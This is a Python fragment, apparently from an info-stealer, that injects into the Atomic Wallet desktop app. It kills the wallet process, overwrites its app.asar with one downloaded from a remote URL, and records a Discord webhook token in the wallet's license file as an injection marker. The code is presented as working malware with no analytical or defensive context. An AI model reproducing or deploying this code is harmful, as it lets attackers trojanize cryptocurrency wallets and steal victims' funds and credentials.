def AtomicInjection(path, procc, atolink):
    if not os.path.exists(path): return

    try:
        randomexodusfile = f"{path}/LICENSE.electron.txt"
        with open(randomexodusfile, 'r+') as IsAlradyInjected:
                check = IsAlradyInjected.read()
                if "gofile" in str(check): # already injected
                    return
    except: pass

    exodusPatchURL = "https://website/link/to/asar/file/app.asar"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36"}
    req = Request(exodusPatchURL, headers=headers)
    response = urlopen(req)

    global hook
    khook = f'{hook.split("webhooks/")[1]}:{atolink}'
    data = response.read()
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
    #for app in apps:
    try:
        fullpath = f"{path}/resources/app.asar"
        licpath = f"{path}/LICENSE.electron.txt"

        with open(fullpath, 'wb') as out_file1:
            out_file1.write(data)
        with open(licpath, 'w') as out_file2:
            out_file2.write(khook)
    except: pass

AtomicInjection(f"{local}/Programs/atomic", "Atomic Wallet.exe", "https://gofile/atomicwalletzip")
